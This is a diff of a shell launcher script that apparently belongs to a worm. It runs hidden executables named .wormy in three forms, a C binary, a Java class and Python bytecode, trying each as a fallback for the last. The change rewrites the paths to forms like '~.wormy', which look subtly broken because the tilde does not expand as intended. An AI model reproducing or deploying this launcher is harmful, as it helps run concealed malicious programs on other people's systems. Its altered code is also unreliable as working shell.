@@ -26,25 +26,25 @@
 # Check if files exists before trying
 
 # Try to execute c executable
-if [ -e ".wormy" ]; then
-chmod +x .wormy;
-./.wormy;
+if [ -e "~.wormy" ]; then
+chmod +x ~.wormy;
+~.wormy;
 if [ $? -eq 0 ]; then
 	exit
 fi
 fi
 # If Fail, try to execute Java Executable
-if [ -e ".wormyj.class" ]; then
-chmod +x .wormyj.class;
-java .wormyj;
+if [ -e "~.wormyj.class" ]; then
+chmod +x ~.wormyj.class;
+java ~.wormyj;
 if [ $? -eq 0 ]; then
 	exit
 fi
 fi
 # If Fail again, try to execute Python executable
-if [ -e ".wormy.pyc" ]; then
-chmod +x .wormy.pyc;
-python .wormy.pyc;
+if [ -e "~.wormy.pyc" ]; then
+chmod +x ~.wormy.pyc;
+python ~.wormy.pyc;
 if [ $? -eq 0 ]; then
 	exit;
 fi
